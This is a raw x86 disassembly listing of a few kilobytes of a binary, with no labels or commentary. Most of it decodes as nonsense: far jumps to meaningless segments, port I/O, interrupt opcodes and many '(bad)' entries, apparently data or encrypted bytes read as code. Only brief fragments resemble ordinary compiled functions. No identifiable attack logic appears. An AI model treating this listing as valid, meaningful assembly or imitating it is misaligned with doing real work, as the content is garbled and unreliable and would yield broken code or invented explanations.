  4079f3:	push   edx
  4079f4:	dec    esp
  4079f5:	ret    0x94fa
  4079f8:	or     dh,BYTE PTR [eax+0x6]
  4079fb:	push   ss
  4079fc:	adc    ebx,DWORD PTR ds:0x77675308
  407a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a03:	icebp  
  407a04:	fcmovnbe st,st(5)
  407a06:	and    al,0x8d
  407a08:	rol    DWORD PTR [ecx+0x6a],0x43
  407a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a0d:	aaa    
  407a0e:	fucom  st(5)
  407a10:	pop    edi
  407a11:	fsubr  DWORD PTR [edx+esi*4]
  407a14:	shl    DWORD PTR [esi+ecx*8+0x4464f78c],1
  407a1b:	inc    eax
  407a1c:	call   0x1a9de75e
  407a21:	xchg   esi,eax
  407a22:	loopne 0x407a05
  407a24:	gs adc al,0x26
  407a27:	push   edi
  407a28:	neg    edx
  407a2a:	aam    0xa
  407a2c:	repnz scas eax,DWORD PTR es:[edi]
  407a2e:	add    bh,dh
  407a30:	cwde   
  407a31:	ja     0x4079db
  407a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a34:	je     0x4079b9
  407a36:	xchg   ebx,eax
  407a37:	xor    esi,DWORD PTR [ecx+0x196418bd]
  407a3d:	jae    0x407a17
  407a3f:	mov    ebp,0xc8276cd9
  407a44:	dec    ebp
  407a45:	xchg   esi,eax
  407a46:	mov    esp,0x24b07d4b
  407a4b:	adc    eax,0x403a3fc9
  407a50:	iret   
  407a51:	cmc    
  407a52:	test   al,0xa
  407a54:	mov    ch,0x53
  407a56:	or     al,0x1f
  407a58:	and    al,0x4e
  407a5a:	call   ebp
  407a5c:	mov    esi,ebp
  407a5e:	mov    ebp,0x50b259f
  407a63:	daa    
  407a64:	ins    BYTE PTR es:[edi],dx
  407a65:	retfw  
  407a67:	xchg   DWORD PTR [esi],ecx
  407a69:	lods   al,BYTE PTR ds:[esi]
  407a6b:	pushf  
  407a6c:	out    0x66,al
  407a6e:	cdq    
  407a6f:	fisttp QWORD PTR [eax+edi*8-0x1d88166a]
  407a76:	add    eax,0x481a257e
  407a7b:	mov    eax,ds:0xf5e5293d
  407a80:	sbb    esi,edx
  407a82:	cwde   
  407a83:	test   BYTE PTR [ebp+0x60df7315],al
  407a89:	cmc    
  407a8a:	aam    0x2d
  407a8c:	or     al,0xab
  407a8e:	loop   0x407ad3
  407a90:	push   ds
  407a91:	xor    ebx,DWORD PTR [esi+0x64]
  407a94:	hlt    
  407a95:	push   cs
  407a96:	sub    BYTE PTR [edi+0x74],dh
  407a99:	iret   
  407a9a:	aad    0x1b
  407a9c:	popf   
  407a9d:	xchg   edx,eax
  407a9e:	sti    
  407a9f:	scas   eax,DWORD PTR es:[edi]
  407aa0:	or     eax,0x510d657
  407aa5:	iret   
  407aa6:	es pop esp
  407aa8:	mov    al,ds:0x789b1136
  407aad:	dec    edi
  407aae:	inc    esp
  407aaf:	push   esi
  407ab0:	cmp    eax,0xde142dd5
  407ab5:	jb     0x407a77
  407ab7:	or     eax,0x266507e5
  407abc:	fidiv  DWORD PTR ds:0x16b52428
  407ac2:	fcomp  DWORD PTR [esi]
  407ac4:	rcr    BYTE PTR [ecx],cl
  407ac6:	push   cs
  407ac7:	push   edx
  407ac8:	and    BYTE PTR [edi*1+0x7947d847],cl
  407acf:	ds loope 0x407a7d
  407ad2:	mov    bh,0x62
  407ad4:	cli    
  407ad5:	aaa    
  407ad6:	sbb    ecx,DWORD PTR [ebx]
  407ad8:	cmp    al,0x47
  407ada:	xchg   edi,eax
  407adb:	push   ebp
  407adc:	cmp    bl,BYTE PTR [ebx+0x355e71a8]
  407ae2:	fistp  QWORD PTR [edx+0x4]
  407ae5:	xor    al,0x18
  407ae7:	mov    edx,DWORD PTR [ebx+0x25cc1492]
  407aed:	mov    ecx,0xcee2fc01
  407af2:	push   esp
  407af3:	out    0xe8,al
  407af5:	xor    al,0x40
  407af7:	push   ds
  407af8:	fwait
  407af9:	xchg   esi,eax
  407afa:	addr16 pushf 
  407afc:	ins    DWORD PTR es:[edi],dx
  407afd:	popa   
  407afe:	nop
  407aff:	pop    ds
  407b00:	sahf   
  407b01:	push   0xfb233e81
  407b06:	inc    esi
  407b07:	push   ecx
  407b08:	outs   dx,BYTE PTR ds:[esi]
  407b09:	sub    al,0xf8
  407b0b:	retf   0x6495
  407b0e:	adc    dl,BYTE PTR [edi+ebp*2+0x501121b1]
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	cld    
  407b40:	mov    cl,0xe8
  407b42:	or     al,0x57
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b64
  407b4c:	xchg   esp,eax
  407b4d:	adc    esi,esp
  407b4f:	mov    edx,0x3029458c
  407b54:	mov    al,0x49
  407b56:	les    ebp,FWORD PTR [edi-0x65]
  407b59:	push   cs
  407b5a:	cmp    eax,0x9d0d0fac
  407b5f:	imul   edi,DWORD PTR [ecx+0x7e1d98cb],0xe0237a7b
  407b69:	fsubr  st(4),st
  407b6b:	jp     0x407b4e
  407b6d:	call   0xf003:0x5d05eca7
  407b74:	ficomp WORD PTR [edx-0x29]
  407b77:	push   edx
  407b78:	std    
  407b79:	or     BYTE PTR [ecx+edi*8+0x17ace76],cl
  407b80:	fisttp DWORD PTR [esi+0x5]
  407b83:	or     edi,DWORD PTR [ebp+0x69]
  407b86:	or     ebx,ebx
  407b88:	shr    DWORD PTR gs:[edi],0x79
  407b8c:	in     al,dx
  407b8d:	jnp    0x407c0d
  407b8f:	cwde   
  407b90:	pop    ds
  407b91:	pusha  
  407b92:	cld    
  407b93:	mov    edi,0xbd6d21e9
  407b98:	stos   BYTE PTR es:[edi],al
  407b99:	and    DWORD PTR [esi],ebp
  407b9b:	mov    ah,0x43
  407b9d:	jno    0x407b3f
  407b9f:	mov    edi,0xa7704e56
  407ba4:	push   eax
  407ba5:	push   ebp
  407ba6:	retf   0xccf9
  407ba9:	cwde   
  407baa:	add    al,BYTE PTR [ecx]
  407bac:	or     edx,esp
  407bae:	out    0x22,al
  407bb0:	fmul   DWORD PTR [edi-0x13]
  407bb3:	add    eax,0xeb5f23cc
  407bb8:	sbb    DWORD PTR [ecx+0x78faf0d6],ebp
  407bbe:	add    DWORD PTR [eax-0x4a8e77f8],edx
  407bc4:	and    BYTE PTR [edx+ebx*2-0x54cce70e],dl
  407bcb:	or     BYTE PTR [esp+esi*4],bl
  407bce:	mov    eax,0x7663f716
  407bd3:	adc    edx,DWORD PTR [esi+ebx*2]
  407bd6:	(bad)  
  407bd7:	mov    ch,0x4
  407bd9:	and    edx,esp
  407bdb:	push   0xffffffab
  407bdd:	mov    esi,0xc4ce1aa0
  407be2:	lds    esp,FWORD PTR [ebp+eiz*8+0x77]
  407be6:	shl    BYTE PTR [edi+0xc2744e2],0x3
  407bed:	push   ecx
  407bee:	out    0xce,al
  407bf0:	xor    esi,DWORD PTR [ecx+0x7d853cde]
  407bf6:	retf   
  407bf7:	fwait
  407bf8:	out    dx,eax
  407bf9:	cs test al,0x21
  407bfc:	or     edi,DWORD PTR [esp+ebx*1]
  407bff:	aad    0xca
  407c01:	push   ebp
  407c02:	cmp    bh,BYTE PTR [ecx-0x8]
  407c05:	cmp    al,0x76
  407c07:	sti    
  407c08:	mov    edx,0xa0036ef4
  407c0d:	fidivr DWORD PTR [ebp-0x7]
  407c10:	pop    edx
  407c11:	xor    eax,0x7dff764
  407c16:	rol    DWORD PTR [eax-0x592b8afb],1
  407c1c:	cmp    DWORD PTR [ebx],ebx
  407c1e:	bound  ecx,QWORD PTR [edx]
  407c20:	push   esi
  407c21:	sub    al,0xf1
  407c24:	xchg   esi,eax
  407c25:	ficomp WORD PTR ds:0x1f2e69cc
  407c2b:	rcr    BYTE PTR [ecx+0x37],1
  407c2e:	or     dl,dl
  407c30:	std    
  407c31:	xlat   BYTE PTR ds:[ebx]
  407c32:	mov    DWORD PTR [eax],0x24084bd8
  407c38:	lea    esi,[ecx+0x65]
  407c3b:	leave  
  407c3c:	mov    esi,DWORD PTR [ebx]
  407c3e:	push   es
  407c3f:	cwde   
  407c40:	xor    ch,BYTE PTR [esi]
  407c42:	add    eax,DWORD PTR ss:[edx]
  407c45:	push   edi
  407c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c47:	test   al,0x74
  407c49:	repnz retf 0xd5c
  407c4d:	jmp    0x2c5c:0xb11d3859
  407c54:	mov    BYTE PTR [eax+ebp*1+0x7f],0xc8
  407c59:	mov    bh,0x44
  407c5b:	bnd jo 0x407c9e
  407c5e:	popf   
  407c5f:	cmp    ecx,DWORD PTR [eax-0x7d1482dd]
  407c65:	or     eax,0xdf6bc71b
  407c6a:	add    ebx,edx
  407c6c:	test   eax,0x7d4bfa91
  407c71:	sbb    DWORD PTR [ebx-0x5757eac9],ebp
  407c77:	mov    ds:0xf61c3065,al
  407c7c:	jp     0x407c6c
  407c7e:	cmp    ecx,DWORD PTR [eax+0x4b]
  407c81:	pusha  
  407c82:	repz or edx,0xcefc0dfb
  407c89:	and    al,0xf2
  407c8b:	scas   al,BYTE PTR es:[edi]
  407c8c:	call   0xcf326d00
  407c91:	and    ebp,ecx
  407c93:	adc    edi,DWORD PTR [esi]
  407c95:	mov    al,ds:0x5c0ee48e
  407c9a:	inc    ebp
  407c9b:	les    ebx,FWORD PTR [edx]
  407c9d:	cmp    eax,0xc0b00e4e
  407ca2:	mov    dh,0x7
  407ca4:	jnp    0x407cbb
  407ca6:	push   esp
  407ca7:	xchg   DWORD PTR [edx+0x25735df6],esp
  407cad:	out    dx,eax
  407cae:	ret    
  407caf:	jne    0x407d0e
  407cb1:	seta   BYTE PTR [edx+ebx*1]
  407cb5:	imul   ecx,DWORD PTR ds:0xf12e11a3,0xfffffff2
  407cbc:	test   al,0x1c
  407cbe:	test   DWORD PTR [edx-0xb],ecx
  407cc1:	es int3 
  407cc3:	inc    ecx
  407cc4:	xchg   edx,eax
  407cc5:	jle    0x407d11
  407cc7:	cwde   
  407cc8:	bound  eax,QWORD PTR [edx-0x41]
  407ccb:	mov    fs,WORD PTR [ebp+0x38]
  407cce:	and    BYTE PTR [eax+0x7fb0de02],bh
  407cd4:	and    BYTE PTR [ebx+0x702783cf],dl
  407cda:	out    0x6d,eax
  407cdc:	dec    ebp
  407cdd:	mov    es,WORD PTR [ecx-0x29]
  407ce0:	mov    ds:0xbeca66d2,eax
  407ce5:	outs   dx,BYTE PTR ds:[esi]
  407ce6:	mov    eax,ds:0x9ae24006
  407ceb:	das    
  407cec:	retf   0xbb0e
  407cef:	xor    ebx,DWORD PTR [esi+0x3d]
  407cf2:	push   esp
  407cf3:	pop    ebx
  407cf4:	call   0x6583:0xf053bdb4
  407cfb:	pop    edi
  407cfc:	xchg   ebx,eax
  407cfd:	leave  
  407cfe:	popa   
  407cff:	fstp   DWORD PTR [ecx-0x5f]
  407d02:	push   ds
  407d03:	fnsave [ecx-0xd96568d]
  407d09:	mov    dl,0xec
  407d0b:	inc    ebx
  407d0c:	and    dh,ah
  407d0e:	or     ah,cl
  407d10:	or     al,cl
  407d12:	outs   dx,BYTE PTR ds:[esi]
  407d13:	icebp  
  407d14:	and    ebx,DWORD PTR [ecx-0x2c]
  407d17:	scas   eax,DWORD PTR es:[edi]
  407d18:	retf   
  407d19:	sbb    edi,DWORD PTR [ebx-0x46379e0a]
  407d1f:	xchg   ecx,eax
  407d20:	repz repnz test DWORD PTR [edx-0xa],0xc0b12f1d
  407d29:	aad    0x5e
  407d2b:	pop    esi
  407d2c:	mov    al,ds:0x8223355f
  407d31:	cmp    cl,ch
  407d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d34:	and    eax,0x28f6acf
  407d39:	mov    edx,0xb7ff1820
  407d3e:	push   si
  407d40:	xchg   esi,eax
  407d41:	pop    ebx
  407d42:	inc    edx
  407d43:	dec    ecx
  407d44:	es jmp 0x407d7b
  407d47:	jae    0x407d7d
  407d49:	cmp    al,0xa1
  407d4b:	loopne 0x407d3b
  407d4d:	xchg   esi,eax
  407d4e:	xor    DWORD PTR [eax+0x4ec68a0f],edi
  407d54:	shl    DWORD PTR [edx+0x7b6dc1b],1
  407d5a:	and    esi,DWORD PTR [edi+0x3e2206c9]
  407d60:	shl    esp,0x1c
  407d63:	test   al,0x35
  407d65:	cmp    DWORD PTR [ebp+0x7f],ebp
  407d68:	jge    0x407d7f
  407d6a:	stc    
  407d6b:	retf   0xfc7c
  407d6e:	cmp    ch,BYTE PTR [eax]
  407d70:	sub    BYTE PTR [eax],dl
  407d72:	imul   ecx,DWORD PTR [esi-0x5d],0x24d519eb
  407d79:	mov    edi,0xb72b01b4
  407d7e:	cmp    BYTE PTR [esi+0xd],dh
  407d81:	in     al,0xb2
  407d83:	loop   0x407ddf
  407d85:	push   ecx
  407d86:	push   ebx
  407d87:	adc    al,0x78
  407d89:	jnp    0x407d2c
  407d8b:	pop    es
  407d8c:	mov    DWORD PTR ds:0x4ce64f00,esi
  407d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d93:	(bad)  
  407d94:	sub    al,0x56
  407d96:	jmp    0xd309:0x877da7e6
  407d9d:	test   al,0x9
  407d9f:	adc    bh,BYTE PTR [ebx]
  407da1:	std    
  407da2:	pop    ebx
  407da3:	retf   0x7a5c
  407da6:	loop   0x407da6
  407da8:	xchg   DWORD PTR [edi],ebp
  407daa:	mov    cl,0x82
  407dac:	adc    BYTE PTR [ebp+0x22],bh
  407daf:	mov    ebx,0x4a7ab983
  407db4:	sub    ebp,edx
  407db6:	inc    edi
  407db7:	(bad)  
  407db9:	add    ebp,DWORD PTR [edx+0x14c2619d]
  407dbf:	stos   DWORD PTR es:[edi],eax
  407dc0:	dec    ecx
  407dc1:	mov    dl,0xb8
  407dc3:	pop    esi
  407dc4:	retf   0x8832
  407dc7:	shl    DWORD PTR [edi-0x2aca8820],1
  407dcd:	push   ds
  407dce:	fsub   QWORD PTR [ebx-0x66]
  407dd1:	test   BYTE PTR [edx-0x6c4d0a15],cl
  407dd7:	int    0x69
  407dd9:	sahf   
  407dda:	jbe    0x407da5
  407ddc:	jmp    0x407d9c
  407dde:	ja     0x407e3c
  407de0:	stc    
  407de1:	jmp    0x3a67:0x2a2e6eb3
  407de8:	std    
  407de9:	xor    dh,BYTE PTR [esi-0x73743022]
  407def:	jge    0x407dbf
  407df1:	adc    DWORD PTR [eax-0x15],0x1311ef50
  407df8:	dec    BYTE PTR [ecx+0x5e6218a1]
  407dfe:	ret    
  407dff:	jecxz  0x407dd9
  407e01:	aaa    
  407e02:	pop    edi
  407e03:	push   0xffffffbb
  407e05:	dec    edi
  407e06:	lea    esi,[ebx+ebp*4+0x8eb90b4]
  407e0d:	mov    BYTE PTR [eax+0x71],dl
  407e10:	inc    ebx
  407e11:	dec    ebp
  407e12:	dec    eax
  407e13:	test   DWORD PTR [ebx+0x45ddbc8d],0x32a88c9f
  407e1d:	das    
  407e1e:	ja     0x407e9f
  407e20:	daa    
  407e21:	dec    edx
  407e22:	popf   
  407e23:	mov    ch,0x5c
  407e25:	aas    
  407e26:	popf   
  407e27:	add    BYTE PTR [ebx-0x6b193679],bh
  407e2d:	push   eax
  407e2e:	xchg   edx,eax
  407e2f:	fwait
  407e30:	ret    
  407e31:	mov    dh,bh
  407e33:	cs pop eax
  407e35:	aad    0xcd
  407e37:	pushf  
  407e38:	adc    eax,0xf95f1259
  407e3d:	out    dx,eax
  407e3e:	add    ch,0x6d
  407e41:	inc    ecx
  407e42:	and    eax,0xb92fff7
  407e47:	pusha  
  407e48:	adc    BYTE PTR [ebx+0x52],al
  407e4b:	cmp    ah,BYTE PTR [eax+0x31]
  407e4e:	mov    edx,0x1b9fb4bd
  407e53:	ins    DWORD PTR es:[edi],dx
  407e54:	sub    al,0xc1
  407e56:	push   ebp
  407e57:	or     DWORD PTR [ebp+0x7f340819],eax
  407e5d:	jle    0x407e5d
  407e5f:	push   0xc
  407e61:	xchg   ecx,eax
  407e62:	and    al,0xe2
  407e64:	cld    
  407e65:	imul   eax,DWORD PTR [ebp+0x6c],0x79435f07
  407e6c:	int3   
  407e6d:	jg     0x407e3d
  407e6f:	xchg   esi,eax
  407e70:	ret    
  407e71:	jnp    0x407df5
  407e73:	mov    eax,ds:0x6838e137
  407e78:	jl     0x407e4f
  407e7a:	push   ecx
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	pop    eax
  407e99:	mov    bl,0xa5
  407e9b:	popw   es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407f02
  407ea5:	(bad)  
  407ea6:	lods   al,BYTE PTR ds:[esi]
  407ea7:	sahf   
  407ea8:	scas   al,BYTE PTR es:[edi]
  407ea9:	out    dx,al
  407eaa:	jg     0x407f01
  407eac:	(bad)  
  407ead:	xor    al,0x78
  407eaf:	and    ecx,DWORD PTR [edx-0x4]
  407eb2:	outs   dx,DWORD PTR ds:[esi]
  407eb3:	stc    
  407eb4:	lods   al,BYTE PTR ds:[esi]
  407eb5:	add    DWORD PTR [ecx+0x6e697c0],ebx
  407ebb:	out    dx,al
  407ebc:	adc    DWORD PTR [esi],ebx
  407ebe:	push   es
  407ebf:	add    BYTE PTR [ecx+0x3ee8949e],cl
  407ec5:	inc    ebp
  407ec6:	adc    DWORD PTR [edx],0xffffffb6
  407ec9:	cld    
  407eca:	dec    eax
  407ecb:	pop    esi
  407ecc:	mov    BYTE PTR [esi],ah
  407ece:	inc    ebp
  407ecf:	aad    0x50
  407ed1:	js     0x407ecf
  407ed3:	cld    
  407ed4:	mov    al,0xc2
  407ed6:	lods   eax,DWORD PTR ds:[esi]
  407ed7:	sub    BYTE PTR [eax-0x7f],0x34
  407edb:	call   0xf4fa0f2
  407ee0:	lods   eax,DWORD PTR ds:[esi]
  407ee1:	pop    edi
  407ee2:	sar    DWORD PTR [ecx],0xc5
  407ee5:	popa   
  407ee6:	test   BYTE PTR [ebx],ch
  407ee8:	aaa    
  407ee9:	fistp  WORD PTR [edx-0x68de4888]
  407eef:	adc    eax,0xf8b67c0f
  407ef4:	mov    ebx,0x2d302453
  407ef9:	(bad)  
  407efa:	sbb    BYTE PTR [edx-0x33fd53cb],dh
  407f00:	jmp    0x407ee4
  407f02:	fstp   TBYTE PTR [ebx+0x489f9fed]
  407f08:	int    0xfd
  407f0a:	aaa    
  407f0b:	or     ah,bl
  407f0d:	jmp    FWORD PTR [esi]
  407f0f:	aaa    
  407f10:	gs pop es
  407f12:	jecxz  0x407f07
  407f14:	add    BYTE PTR [edx],al
  407f16:	push   es
  407f17:	mov    DWORD PTR [edx-0x4b],edx
  407f1a:	(bad)
  407f1d:	adc    eax,0x2a545354
  407f22:	mov    eax,ds:0x123e87a6
  407f27:	mov    WORD PTR [bx+di],ds
  407f2a:	push   ecx
  407f2b:	mov    bl,0xb8
  407f2d:	and    DWORD PTR [edi+0x4a],0x19
  407f31:	lods   eax,DWORD PTR ds:[esi]
  407f32:	mov    DWORD PTR [ecx],edi
  407f34:	xchg   ebx,eax
  407f35:	not    DWORD PTR [eax]
  407f37:	out    0xe7,al
  407f39:	neg    ah
  407f3b:	clc    
  407f3c:	call   0x3abc:0x5fef8cba
  407f43:	pushf  
  407f44:	jmp    0x407ecd
  407f46:	jno    0x407fa6
  407f48:	jae    0x407ed2
  407f4a:	xchg   edx,eax
  407f4b:	retf   
  407f4c:	push   0x2e
  407f4e:	pop    esi
  407f4f:	or     DWORD PTR [esi],ebp
  407f51:	jmp    0x5a94:0xf137a16
  407f58:	or     ah,BYTE PTR [ebp-0x49]
  407f5b:	mov    dh,0x83
  407f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f5e:	fcom   QWORD PTR [ebx]
  407f60:	sbb    bh,BYTE PTR [ebx]
  407f62:	cmp    BYTE PTR [esi+edi*8-0x75],ah
  407f66:	ss ins DWORD PTR es:[edi],dx
  407f68:	add    eax,0xcb5e0aa1
  407f6d:	inc    edx
  407f6e:	enter  0x5e90,0xbe
  407f72:	inc    esi
  407f73:	xchg   esi,eax
  407f74:	inc    ebx
  407f75:	xchg   esi,eax
  407f76:	gs mov dl,0xd8
  407f79:	scas   eax,DWORD PTR es:[edi]
  407f7a:	mov    al,dh
  407f7c:	and    BYTE PTR [eax],bh
  407f7e:	sbb    DWORD PTR [ebx+0x68f15bda],0xffffffe5
  407f85:	mov    dh,ch
  407f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f88:	(bad)  
  407f89:	cwde   
  407f8a:	or     bl,al
  407f8c:	xchg   ebp,eax
  407f8d:	sub    bl,bh
  407f8f:	sbb    BYTE PTR [edi],0x46
  407f92:	inc    ebp
  407f93:	xchg   esi,eax
  407f94:	or     eax,0x3735c4c6
  407f99:	outs   dx,DWORD PTR ds:[esi]
  407f9a:	(bad)  
  407f9b:	cmp    edx,eax
  407f9d:	mov    BYTE PTR [ecx],bl
  407f9f:	xchg   ecx,eax
  407fa0:	inc    edi
  407fa1:	push   esp
  407fa2:	sbb    eax,0x9a6cbab3
  407fa7:	push   edx
  407fa8:	sti    
  407fa9:	(bad)  
  407faa:	popf   
  407fab:	xchg   esi,eax
  407fac:	mov    edx,0x9ff96c44
  407fb1:	test   al,0x6c
  407fb3:	dec    esi
  407fb4:	sub    al,0xd2
  407fb6:	adc    al,0xb7
  407fb9:	je     0x407f5b
  407fbb:	mov    ebx,0xf9a4c3be
  407fc0:	sub    DWORD PTR [edi+0x56f3e275],edx
  407fc6:	rol    DWORD PTR [eax],0x22
  407fc9:	or     eax,0x9497d3f7
  407fce:	xchg   edx,eax
  407fcf:	aas    
  407fd0:	fstp   QWORD PTR [esi]
  407fd2:	sbb    eax,0x84b4474b
  407fd7:	frstor [ebx+ecx*1-0x1d]
  407fdb:	add    DWORD PTR [edi+0x6c],eax
  407fde:	or     DWORD PTR [eax],ecx
  407fe0:	sbb    DWORD PTR [esi+ebx*8-0x57104be],edx
  407fe7:	mov    ah,0xba
  407fe9:	(bad)  
  407fea:	je     0x407fca
  407fec:	and    BYTE PTR [edx+0x2a389517],cl
  407ff2:	popa   
  407ff3:	push   esi
  407ff4:	pop    ds
  407ff5:	test   BYTE PTR [esi-0x4de92eea],cl
  407ffb:	or     eax,0xc001583d
  408000:	xor    ch,BYTE PTR [ebp+0x6b]
  408003:	ins    DWORD PTR es:[edi],dx
  408004:	test   al,0x2b
  408006:	ins    BYTE PTR es:[edi],dx
  408007:	out    dx,eax
  408008:	sti    
  408009:	push   ss
  40800a:	aad    0x87
  40800c:	sub    cl,al
  40800e:	cdq    
  40800f:	xchg   ecx,eax
  408010:	push   esp
  408011:	inc    esp
  408012:	jmp    0xe98920bc
  408017:	sbb    BYTE PTR [esi],bh
  408019:	adc    BYTE PTR [ecx+0x23],dh
  40801c:	in     al,0x25
  40801e:	push   cs
  40801f:	and    BYTE PTR ds:0x56f7cb6f,al
  408025:	loopne 0x408048
  408027:	xchg   esp,eax
  408028:	push   edx
  408029:	cs sbb al,0xb
  40802c:	dec    ebp
  40802d:	or     eax,0x95c69202
  408032:	fidivr DWORD PTR [ebx+0x54]
  408035:	push   ds
  408036:	add    cl,BYTE PTR [edx-0x35]
  408039:	or     ebp,DWORD PTR [esi+0x7b]
  40803c:	fdivr  DWORD PTR [edi]
  40803e:	jmp    0xf2ca0bf3
  408043:	(bad)  
  408044:	jge    0x40806a
  408046:	scas   al,BYTE PTR es:[edi]
  408047:	add    dh,BYTE PTR [ecx*8-0x7900dea7]
  40804e:	xchg   DWORD PTR [ebx-0x57],ecx
  408051:	in     eax,dx
  408052:	lea    ebp,[ebp-0x34ca946b]
  408058:	mov    ebx,0xec9b4a53
  40805d:	fs xor ecx,eax
  408060:	(bad)  
  408061:	rcl    dh,1
  408063:	loop   0x408049
  408065:	sub    al,0x3b
  408067:	xor    edi,DWORD PTR [esi+0x5ad9c021]
  40806d:	cmp    eax,ebx
  40806f:	mov    ah,0x2d
  408071:	mov    bl,0xb3
  408073:	fmul   DWORD PTR [edx-0x6e]
  408076:	xchg   ebx,eax
  408077:	xor    al,0xc8
  408079:	sbb    DWORD PTR [esi],edx
  40807b:	pop    ebx
  40807c:	test   BYTE PTR [ebx*4-0x63e09d88],0x7f
  408084:	jbe    0x4080da
  408086:	adc    DWORD PTR [ebp+0x46],ecx
  408089:	into   
  40808a:	or     dl,ch
  40808c:	call   0xa6fe:0xd9e92ac5
  408093:	ins    BYTE PTR es:[edi],dx
  408094:	arpl   WORD PTR [ebp+0x3],si
  408097:	mov    al,0x25
  408099:	or     DWORD PTR [esi],esi
  40809b:	fisubr DWORD PTR [esi+0x226f7766]
  4080a1:	loop   0x408041
  4080a3:	hlt    
  4080a4:	lahf   
  4080a5:	and    al,0xb5
  4080a7:	cwde   
  4080a8:	fadd   st(2),st
  4080aa:	mov    cl,0xb0
  4080ac:	jecxz  0x408104
  4080ae:	pop    eax
  4080af:	fidiv  WORD PTR [edx-0x635d2a98]
  4080b5:	xchg   edx,eax
  4080b6:	nop
  4080b7:	dec    ebp
  4080b8:	mov    ecx,0x73e4fc4a
  4080bd:	dec    esi
  4080be:	mov    ds:0xa22e1f60,eax
  4080c3:	fmul   st(4),st
  4080c5:	pop    ds
  4080c6:	std    
  4080c7:	out    dx,al
  4080c8:	outs   dx,BYTE PTR ds:[esi]
  4080c9:	inc    ecx
  4080ca:	outs   dx,BYTE PTR ds:[esi]
  4080cb:	xchg   ecx,eax
  4080cc:	xchg   edi,eax
  4080cd:	mov    ds,edi
  4080cf:	jg     0x40807d
  4080d1:	add    al,0x2d
  4080d3:	xchg   esi,eax
  4080d4:	dec    ecx
  4080d5:	or     BYTE PTR [ebx-0x373eedee],ch
  4080db:	mov    esi,0xe47d4c48
  4080e0:	cmp    ah,BYTE PTR [eax]
  4080e2:	loope  0x4080c4
  4080e4:	sub    eax,0x10909432
  4080e9:	jbe    0x40812c
  4080eb:	or     ebx,DWORD PTR [ebp-0x15647881]
  4080f1:	pop    ds
  4080f2:	sbb    eax,0xddfa2d0
  4080f7:	iret   
  4080f8:	adc    eax,0xe7a16fc5
  4080fd:	das    
  4080fe:	sbb    dh,BYTE PTR [ecx-0x62]
  408101:	fs xchg edi,esi
  408104:	(bad)  
  408105:	mov    ch,0xe0
  408107:	jbe    0x40817e
  408109:	not    DWORD PTR [ebx+0x55]
  40810c:	rcl    BYTE PTR [edx+0x2e],0xe1
  408110:	fdiv   DWORD PTR [edi-0x2d0ab0d0]
  408116:	addr16 iret 
  408118:	add    ebp,ecx
  40811a:	sbb    DWORD PTR [esi+0x7e],eax
  40811d:	lods   al,BYTE PTR ds:[esi]
  40811e:	iret   
  40811f:	xor    al,0xe7
  408121:	sar    BYTE PTR [edx+edx*4+0x2],cl
  408125:	ror    BYTE PTR [ebp-0x6e3b5004],cl
  40812b:	cli    
  40812c:	jp     0x4080f6
  40812e:	ja     0x40818b
  408130:	push   es
  408131:	fcomp  DWORD PTR [ecx]
  408133:	xchg   edx,eax
  408134:	in     al,dx
  408135:	add    eax,0x1768bab3
  40813a:	sub    dl,BYTE PTR [esi+0x75]
  40813d:	cmp    ebx,ecx
  40813f:	mov    edx,0x278cbeb4
  408144:	xchg   edx,eax
  408145:	xor    eax,edi
  408147:	bound  eax,QWORD PTR [edi+0xfbb5041]
  40814d:	in     eax,0x49
  40814f:	sub    eax,0xc031bccd
  408154:	ret    0xe8e1
  408157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408158:	sbb    ebp,DWORD PTR ds:0x134105c2
  40815e:	fistp  QWORD PTR [ecx+0x48]
  408161:	repnz addr16 dec ebp
  408164:	mov    dl,0xe4
  408166:	ret    
  408167:	ficom  WORD PTR [edx]
  408169:	push   0xffffffe7
  40816b:	mov    WORD PTR [edx-0x5a],?
  40816e:	ins    DWORD PTR es:[edi],dx
  40816f:	fstp   QWORD PTR [ebx]
  408171:	mov    bl,0xe0
  408173:	cdq    
  408174:	dec    DWORD PTR [ecx+0xaa62228]
  40817a:	or     ebp,DWORD PTR [ebx]
  40817c:	dec    edx
  40817d:	outs   dx,BYTE PTR ds:[esi]
  40817e:	sub    dl,0xd6
  408181:	mov    edx,0x21f16923
  408186:	adc    eax,0x8
  408189:	or     cl,ah
  40818b:	and    eax,0x5362cbc2
  408190:	sbb    al,0xef
  408192:	aam    0xa2
  408194:	lods   al,BYTE PTR es:[esi]
  408196:	push   ebp
  408197:	neg    ah
  408199:	sub    eax,0x6a5bbc9d
  40819e:	nop
  40819f:	mov    DWORD PTR [ecx-0x1805ed],0xaea2b0f6
